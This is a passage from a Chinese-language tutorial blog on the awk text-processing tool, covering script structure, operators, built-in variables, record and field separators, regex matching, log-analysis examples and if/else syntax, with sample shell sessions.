<li class="lvl-2">
<p>{这里面放的是处理每一行时要执行的语句}</p>
</li>
</ul>
<p>假设有这么一个文件（学生成绩表）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> score</span><br><span class="line">Marry   2143 78 84 77</span><br><span class="line">Jack    2321 66 78 45</span><br><span class="line">Tom     2122 48 77 71</span><br><span class="line">Mike    2537 87 97 95</span><br><span class="line">Bob     2415 40 57 62</span><br></pre></td></tr></table></figure>
<p>awk脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> cal.awk</span><br><span class="line"><span class="comment">#!/bin/awk -f</span></span><br><span class="line"><span class="comment">#运行前</span></span><br><span class="line">BEGIN &#123;</span><br><span class="line">    math = 0</span><br><span class="line">    english = 0</span><br><span class="line">    computer = 0</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;---------------------------------------------\n&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行中</span></span><br><span class="line">&#123;</span><br><span class="line">    math+=<span class="variable">$3</span></span><br><span class="line">    english+=<span class="variable">$4</span></span><br><span class="line">    computer+=<span class="variable">$5</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;%-6s %-6s %4d %8d %8d %8d\n&quot;</span>, <span class="variable">$1</span>,<span class="variable">$2</span>,<span class="variable">$3</span>,<span class="variable">$4</span>,<span class="variable">$5</span>,<span class="variable">$3</span>+<span class="variable">$4</span>+<span class="variable">$5</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行后</span></span><br><span class="line">END &#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;---------------------------------------------\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;  TOTAL:%10d %8d %8d \n&quot;</span>, math, english, computer</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;AVERAGE:%10.2f %8.2f %8.2f\n&quot;</span>, math/NR, english/NR, computer/NR</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><font class="notice">注：END{}中的NR表示已经读出的记录数，就是行号，从1开始</font></p>
<p>我们来看一下执行结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk -f cal.awk score</span><br><span class="line">NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL</span><br><span class="line">---------------------------------------------</span><br><span class="line">Marry  2143     78       84       77      239</span><br><span class="line">Jack   2321     66       78       45      189</span><br><span class="line">Tom    2122     48       77       71      196</span><br><span class="line">Mike   2537     87       97       95      279</span><br><span class="line">Bob    2415     40       57       62      159</span><br><span class="line">---------------------------------------------</span><br><span class="line">  TOTAL:       319      393      350 </span><br><span class="line">AVERAGE:     63.80    78.60    70.00</span><br></pre></td></tr></table></figure>
<h4 id="AWK工作原理">AWK工作原理</h4>
<p>AWK 工作流程可分为三个部分：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>读输入文件之前执行的代码段（由BEGIN关键字标识）。</p>
</li>
<li class="lvl-2">
<p>主循环执行输入文件的代码段。</p>
</li>
<li class="lvl-2">
<p>读输入文件之后的代码段（由END关键字标识）。</p>
</li>
</ul>
<p>命令结构:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123; commands &#125; pattern&#123; commands &#125; END&#123; commands &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>下面的流程图描述出了 AWK 的工作流程：</p>
<p><img src="/posts/247a4e5f//d45d394db034998c8059e647e321a13d.png" alt="img"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>1、通过关键字 BEGIN 执行 BEGIN 块的内容，即 BEGIN 后花括号 <strong>{}</strong> 的内容。</p>
</li>
<li class="lvl-2">
<p>2、完成 BEGIN 块的执行，开始执行body块。</p>
</li>
<li class="lvl-2">
<p>3、读入有 <strong>\n</strong> 换行符分割的记录。</p>
</li>
<li class="lvl-2">
<p>4、将记录按指定的域分隔符划分域，填充域，<strong>$0</strong> 则表示所有域(即一行内容)，**1表示第一个域，∗∗n表示第 n 个域。</p>
</li>
<li class="lvl-2">
<p>5、依次执行各 BODY 块，pattern 部分匹配该行内容成功后，才会执行 awk-commands 的内容。</p>
</li>
<li class="lvl-2">
<p>6、循环读取并执行各行直到文件结束，完成body块执行。</p>
</li>
<li class="lvl-2">
<p>7、开始 END 块执行，END 块可以输出最终结果。</p>
</li>
</ul>
<h5 id="运算符">运算符</h5>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>= += -= *= /= %= ^= **=</td>
<td>赋值</td>
</tr>
<tr>
<td>?:</td>
<td>C条件表达式</td>
</tr>
<tr>
<td>||</td>
<td>逻辑或</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>逻辑与</td>
</tr>
<tr>
<td>~ 和 !~</td>
<td>匹配正则表达式和不匹配正则表达式</td>
</tr>
<tr>
<td>&lt; &lt;= &gt; &gt;= != ==</td>
<td>关系运算符</td>
</tr>
<tr>
<td>空格</td>
<td>连接</td>
</tr>
<tr>
<td>+ -</td>
<td>加，减</td>
</tr>
<tr>
<td>* / %</td>
<td>乘，除与求余</td>
</tr>
<tr>
<td>+ - !</td>
<td>一元加，减和逻辑非</td>
</tr>
<tr>
<td>^ ***</td>
<td>求幂</td>
</tr>
<tr>
<td>++ –</td>
<td>增加或减少，作为前缀或后缀</td>
</tr>
<tr>
<td>$</td>
<td>字段引用</td>
</tr>
<tr>
<td>in</td>
<td>数组成员</td>
</tr>
</tbody>
</table>
<p><strong>过滤第一列大于2的行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$1&gt;2&#x27;</span> <span class="built_in">log</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br></pre></td></tr></table></figure>
<p><strong>过滤第一列等于2的行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$1==2 &#123;print $1,$3&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">2 is</span><br></pre></td></tr></table></figure>
<p><strong>过滤第一列大于2并且第二列等于’Are’的行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">3 Are you</span><br></pre></td></tr></table></figure>
<p><strong>内建变量</strong></p>
<table>
<thead>
<tr>
<th>变量</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$n</td>
<td>当前记录的第n个字段，字段间由FS分隔</td>
</tr>
<tr>
<td>$0</td>
<td>完整的输入记录</td>
</tr>
<tr>
<td>ARGC</td>
<td>命令行参数的数目</td>
</tr>
<tr>
<td>ARGIND</td>
<td>命令行中当前文件的位置(从0开始算)</td>
</tr>
<tr>
<td>ARGV</td>
<td>包含命令行参数的数组</td>
</tr>
<tr>
<td>CONVFMT</td>
<td>数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组</td>
</tr>
<tr>
<td>ERRNO</td>
<td>最后一个系统错误的描述</td>
</tr>
<tr>
<td>FIELDWIDTHS</td>
<td>字段宽度列表(用空格键分隔)</td>
</tr>
<tr>
<td>FILENAME</td>
<td>当前文件名</td>
</tr>
<tr>
<td>FNR</td>
<td>各文件分别计数的行号</td>
</tr>
<tr>
<td>FS</td>
<td>字段分隔符(默认是任何空格)</td>
</tr>
<tr>
<td>IGNORECASE</td>
<td>如果为真，则进行忽略大小写的匹配</td>
</tr>
<tr>
<td>NF</td>
<td>一条记录的字段的数目</td>
</tr>
<tr>
<td>NR</td>
<td>已经读出的记录数，就是行号，从1开始</td>
</tr>
<tr>
<td>OFMT</td>
<td>数字的输出格式(默认值是%.6g)</td>
</tr>
<tr>
<td>OFS</td>
<td>输出记录分隔符（输出换行符），输出时用指定的符号代替换行符</td>
</tr>
<tr>
<td>ORS</td>
<td>输出记录分隔符(默认值是一个换行符)</td>
</tr>
<tr>
<td>RLENGTH</td>
<td>由match函数所匹配的字符串的长度</td>
</tr>
<tr>
<td>RS</td>
<td>记录分隔符(默认是一个换行符)</td>
</tr>
<tr>
<td>RSTART</td>
<td>由match函数所匹配的字符串的第一个位置</td>
</tr>
<tr>
<td>SUBSEP</td>
<td>数组下标分隔符(默认值是/034)</td>
</tr>
</tbody>
</table>
<p>格式化变量说明：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>%s 输出字符串</p>
</li>
<li class="lvl-2">
<p>%i 输出整数</p>
</li>
<li class="lvl-2">
<p>%f 输出浮点数</p>
</li>
</ul>
<p>%-5s 格式为左对齐且宽度为5的字符串代替（-表示左对齐），不使用则是又对齐。<br>
%-4.2f 格式为左对齐宽度为4，保留两位小数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;printf &quot;%8s %8s %8s %8s %8s %8s %8s\n&quot;,&quot;FILENAME&quot;,&quot;ARGC&quot;,&quot;FNR&quot;,&quot;FS&quot;,&quot;NF&quot;,&quot;NR&quot;,&quot;OFS&quot;;printf &quot;---------------------------------------------\n&quot;&#125; &#123;printf &quot;%8s %8s %8s %8s %8s %8s %8s\n&quot;,FILENAME,ARGC,FNR,FS,NF,NR,OFS&#125;&#x27;</span>  <span class="built_in">log</span></span><br><span class="line">FILENAME     ARGC      FNR       FS       NF       NR      OFS</span><br><span class="line">---------------------------------------------</span><br><span class="line">     <span class="built_in">log</span>        2        1                 5        1         </span><br><span class="line">     <span class="built_in">log</span>        2        2                 5        2         </span><br><span class="line">     <span class="built_in">log</span>        2        3                 3        3         </span><br><span class="line">     <span class="built_in">log</span>        2        4                 4        4          </span><br><span class="line"></span><br><span class="line">[root@rocky8:~]# awk -F: <span class="string">&#x27;BEGIN&#123;printf &quot;%4s %4s %4s %4s %4s %4s %4s %4s %4s\n&quot;,&quot;FILENAME&quot;,&quot;ARGC&quot;,&quot;FNR&quot;,&quot;FS&quot;,&quot;NF&quot;,&quot;NR&quot;,&quot;OFS&quot;,&quot;ORS&quot;,&quot;RS&quot;;printf &quot;---------------------------------------------\n&quot;&#125; &#123;printf &quot;%4s %4s %4s %4s %4s %4s %4s %4s %4s\n&quot;,FILENAME,ARGC,FNR,FS,NF,NR,OFS,ORS,RS&#125;&#x27;</span>  <span class="built_in">log</span></span><br><span class="line">FILENAME ARGC  FNR   FS   NF   NR  OFS  ORS   RS</span><br><span class="line">---------------------------------------------</span><br><span class="line"> <span class="built_in">log</span>    2    1    :    1    1         </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> <span class="built_in">log</span>    2    2    :    1    2         </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> <span class="built_in">log</span>    2    3    :    1    3         </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> <span class="built_in">log</span>    2    4    :    1    4         </span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="输出顺序号-NR-匹配文本行号">输出顺序号 NR, 匹配文本行号</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print NR,FNR,$1,$2,$3&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">1 1 2 this is</span><br><span class="line">2 2 3 Are you</span><br><span class="line">3 3 This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">4 4 10 There are</span></span><br></pre></td></tr></table></figure>
<h5 id="指定输出分割符">指定输出分割符</h5>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@ubuntu</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat log.txt </span><br><span class="line"><span class="number">2</span> this is a test</span><br><span class="line"><span class="number">3</span> <span class="title class_">Are</span> you like awk</span><br><span class="line"><span class="title class_">This</span><span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">python@ubuntu:~/test$ awk &#x27;</span>&#123;print <span class="variable">$1</span>,<span class="variable">$2</span>,<span class="variable">$5</span>&#125;<span class="string">&#x27; OFS=&quot; $ &quot;  log.txt</span></span><br><span class="line"><span class="string">2 $ this $ test</span></span><br><span class="line"><span class="string">3 $ Are $ awk</span></span><br><span class="line"><span class="string">This&#x27;</span>s <span class="variable">$ </span>a <span class="variable">$ </span></span><br><span class="line"><span class="number">10</span> <span class="variable">$ </span><span class="title class_">There</span> <span class="variable">$ </span></span><br><span class="line"><span class="number">12345678910</span></span><br></pre></td></tr></table></figure>
<h5 id="忽略大小写">忽略大小写</h5>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="section">$ awk &#x27;BEGIN&#123;IGNORECASE=1&#125; /this/&#x27; log.txt</span></span><br><span class="line"><span class="section">---------------------------------------------</span></span><br><span class="line">2 this is a test</span><br><span class="line">This&#x27;s a test</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<h4 id="RS-ORS-FS-OFS区别与联系">RS,ORS,FS,OFS区别与联系</h4>
<p>学习awk时，一定要记得动手去实践，只有在实践中才能发现问题，以下就我在学习中和实践中的经验，总结一下RS,ORS,FS,OFS的区别和联系。</p>
<p><strong>一，RS与ORS</strong></p>
<p>1，RS是记录<a href="https://so.csdn.net/so/search?q=%E5%88%86%E9%9A%94%E7%AC%A6&amp;spm=1001.2101.3001.7020">分隔符</a>，默认的分隔符是\n，具体用法看下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> test1</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br></pre></td></tr></table></figure>
<p>2，RS默认分割符\n</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span> test1  //awk <span class="string">&#x27;BEGIN&#123;RS=&quot;\n&quot;&#125;&#123;print $0&#125;&#x27;</span> test1 这二个是一样的</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br></pre></td></tr></table></figure>
<p>其实你可以把<strong>上面test1文件里的内容理解为，111 222\n333 444\n555 6666，利用\n进行分割</strong>。看下一个例子</p>
<p>3，自定义RS分割符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111 222|333 444|555 666&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;RS=&quot;|&quot;&#125;&#123;print $0,RT&#125;&#x27;</span></span><br><span class="line">111 222 |</span><br><span class="line">333 444 |</span><br><span class="line">555 666</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结合上面一个例子，就很容易理解RS的用法了。</p>
<p>4，RS也可能是正则表达式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111 222a333 444b555 666&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;RS=&quot;[a-z]+&quot;&#125;&#123;print $1,RS,RT&#125;&#x27;</span></span><br><span class="line">111 [a-z]+ a</span><br><span class="line">333 [a-z]+ b</span><br><span class="line">555 [a-z]+</span><br></pre></td></tr></table></figure>
<p>从例3和例4，我们可以发现一点，<strong>当RT是利用RS匹配出来的内容。如果RS是某个固定的值时，RT就是RS的内容</strong>。</p>
<p>5，RS为空时</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> -n test2</span><br><span class="line">     1	111 222</span><br><span class="line">     2	</span><br><span class="line">     3	333 444</span><br><span class="line">     4	333 444</span><br><span class="line">     5	</span><br><span class="line">     6	</span><br><span class="line">     7	555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;RS=&quot;&quot;&#125;&#123;print $0&#125;&#x27;</span> test2</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;RS=&quot;&quot;&#125;&#123;print &quot;&lt;&quot;,$0,&quot;&gt;&quot;&#125;&#x27;</span> test2</span><br><span class="line">&lt; 111 222 &gt;</span><br><span class="line">&lt; 333 444       //这一行和下面一行，是一行 </span><br><span class="line">333 444 &gt;</span><br><span class="line">&lt; 555 666 &gt;</span><br></pre></td></tr></table></figure>
<p>6，ORS记录输出分符符，默认值是\n</p>
<p><strong>把ORS理解成RS反过程，这样更容易记忆和理解</strong>，看下面的例子。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;ORS=&quot;\n&quot;&#125;&#123;print $0&#125;&#x27;</span> test1 //awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span> test1二者是一样的</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;ORS=&quot;|&quot;&#125;&#123;print $0&#125;&#x27;</span> test1 </span><br><span class="line">111 222|333 444|555 666|[root@rocky8:~]# </span><br></pre></td></tr></table></figure>
<p><strong>二，FS与OFS</strong>（不理解）</p>
<p>1，FS指定列分割符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111|222|333&quot;</span>|awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> </span><br><span class="line">111|222|333</span><br><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111|222|333&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;FS=&quot;|&quot;&#125;&#123;print $1&#125;&#x27;</span> </span><br><span class="line">111</span><br></pre></td></tr></table></figure>
<p>2，FS也可以用正则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111||222|333&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;FS=&quot;[|]+&quot;&#125;&#123;print $1&#125;&#x27;</span>  </span><br><span class="line">111</span><br></pre></td></tr></table></figure>
<p>3，FS为空的时候（不理解为啥要NF++）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111|222|333&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;FS=&quot;&quot;&#125;&#123;NF++;print $0&#125;&#x27;</span></span><br><span class="line">1 1 1 | 2 2 2 | 3 3 3 </span><br></pre></td></tr></table></figure>
<p><strong>当FS为空的时候，awk会把一行中的每个字符，当成一列来处理</strong>。</p>
<p>4，RS被设定成非\n时，\n会成FS分割符中的一个</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> test1</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;RS=&quot;444&quot;;&#125;&#123;print $2,$3&#125;&#x27;</span> test1</span><br><span class="line">222 333</span><br><span class="line">666</span><br></pre></td></tr></table></figure>
<p><strong>222和333之间是有一个\n的，当RS设定成444后，222和333被认定成同一行的二列了，其实按常规思想是二行的一列才对</strong>。</p>
<p>5，OFS列输出分隔符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;print $1,$2&#125;&#x27;</span> test1</span><br><span class="line">111|222</span><br><span class="line">333|444</span><br><span class="line">555|666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;print $1 OFS $2&#125;&#x27;</span> test1  </span><br><span class="line">111|222</span><br><span class="line">333|444</span><br><span class="line">555|666</span><br></pre></td></tr></table></figure>
<p><strong>test1只有二列，如果100列，都写出来太麻烦了吧。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;print $0&#125;&#x27;</span> test1  </span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;NF=NF;print $0&#125;&#x27;</span> test1 </span><br><span class="line">111|222</span><br><span class="line">333|444</span><br><span class="line">555|666</span><br></pre></td></tr></table></figure>
<p>为什么第二种方法中的OFS生效呢？个人觉得，<strong>awk觉查到列有所变化时，就会让OFS生效</strong>，没变化直接输出了。</p>
<p>此部分转自：<strong>海底苍鹰：</strong><a href="http://blog.51yip.com/shell/1151.html">awk中RS,ORS,FS,OFS区别与联系</a></p>
<h4 id="正则字符串匹配">正则字符串匹配</h4>
<p><strong>~ 表示模式开始。// 中是模式。</strong></p>
<p>输出第二列包含 “th”，并打印第二列与第四列：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$2 ~ /th/ &#123;print $2,$4&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">this a</span><br></pre></td></tr></table></figure>
<p>输出包含&quot;re&quot;的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;/re/ &#123;print $0&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">3 Are you like awk</span><br><span class="line">10 There are orange,apple,mongo</span><br></pre></td></tr></table></figure>
<p><strong>!表示取反</strong></p>
<p>输出第二列不包含 “th”，并打印第二列与第四列：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$2 !~ /th/ &#123;print $0&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br></pre></td></tr></table></figure>
<p>输出不包含&quot;re&quot;的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;!/re/ &#123;print $0&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br></pre></td></tr></table></figure>
<h4 id="一些实例">一些实例</h4>
<p><strong>计算文件大小</strong></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="keyword">ls</span> -<span class="keyword">l</span> | awk &#x27;&#123;<span class="keyword">sum</span>+=<span class="variable">$5&#125;</span>END&#123;<span class="keyword">print</span> <span class="keyword">sum</span>&#125;&#x27;</span><br><span class="line">1066</span><br></pre></td></tr></table></figure>
<p><strong>从文件中找出长度大于80的行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;length&gt;80&#x27;</span> <span class="built_in">log</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">seq</span> 100|sed <span class="string">&quot;:a;N;s/\n//g;ta&quot;</span> &gt;&gt; <span class="built_in">log</span></span><br><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> <span class="built_in">log</span></span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100</span></span><br><span class="line"><span class="string">[root@rocky8:~]# awk &#x27;</span>length&gt;80<span class="string">&#x27; log</span></span><br><span class="line"><span class="string">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100</span></span><br></pre></td></tr></table></figure>
<p><strong>打印九九乘法表</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">seq</span> 9 | sed <span class="string">&#x27;H;g&#x27;</span> | awk -v RS=<span class="string">&#x27;&#x27;</span> <span class="string">&#x27;&#123;for(i=1;i&lt;=NF;i++)printf(&quot;%dx%d=%d%s&quot;, i, NR, i*NR, i==NR?&quot;\n&quot;:&quot;\t&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>访问日志分析</strong></p>
<p>日志格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">head</span> access.log -n1</span><br><span class="line">42.236.10.75 <span class="string">&quot;changtou.xiaoxiaoming.xyz&quot;</span> [14/Oct/2019:12:47:18 +0800] <span class="string">&quot;GET /logo/8@3x.png HTTP/1.1&quot;</span> 200 26053 <span class="string">&quot;https://changtou.xiaoxiaoming.xyz/&quot;</span> <span class="string">&quot;Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN&quot;</span> <span class="string">&quot;42.236.10.75&quot;</span> rt=<span class="string">&quot;0.000&quot;</span> uct=<span class="string">&quot;-&quot;</span> uht=<span class="string">&quot;-&quot;</span> urt=<span class="string">&quot;-&quot;</span></span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.数据清洗</span><br><span class="line">awk <span class="string">&#x27;($6 ~ /.html/) &amp;&amp; ($8 ~ /200/)  &#123;print $0&#125;&#x27;</span> access.log &gt; clean.log</span><br><span class="line"></span><br><span class="line">2.统计PV</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span>  clean.log | <span class="built_in">wc</span> -l</span><br><span class="line">700</span><br><span class="line">[root@rocky8:~]# <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 clean.log|<span class="built_in">wc</span> -l    </span><br><span class="line">700</span><br><span class="line"></span><br><span class="line">3:UV</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>  clean.log |<span class="built_in">sort</span>|<span class="built_in">uniq</span>| <span class="built_in">wc</span> -l</span><br><span class="line">155</span><br><span class="line">[root@rocky8:~]# <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 clean.log|<span class="built_in">sort</span>|<span class="built_in">uniq</span>| <span class="built_in">wc</span> -l</span><br><span class="line">155</span><br><span class="line"></span><br><span class="line">4:获取每天访问网站最多的前10名用户</span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> clean.log|<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -k 1nr|<span class="built_in">head</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 clean.log|<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -k 1nr|<span class="built_in">head</span></span><br></pre></td></tr></table></figure>
<h3 id="awk编程">awk编程</h3>
<h4 id="条件语句IF-ELSE">条件语句IF&amp;ELSE</h4>
<p>IF 条件语句语法格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    action</span><br></pre></td></tr></table></figure>
<p>也可以使用花括号来执行一组操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">&#123;</span><br><span class="line">    action-1</span><br><span class="line">    action-2</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    action-n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断数字是奇数还是偶数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;num = 10; if (num % 2 == 0) printf &quot;%d 是偶数\n&quot;, num &#125;&#x27;</span></span><br><span class="line">10 是偶数</span><br></pre></td></tr></table></figure>
<p>IF - ELSE 条件语句语法格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    action-1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    action-2</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>在条件语句 condition 为 true 时只需 action-1，否则执行 action-2。</p>
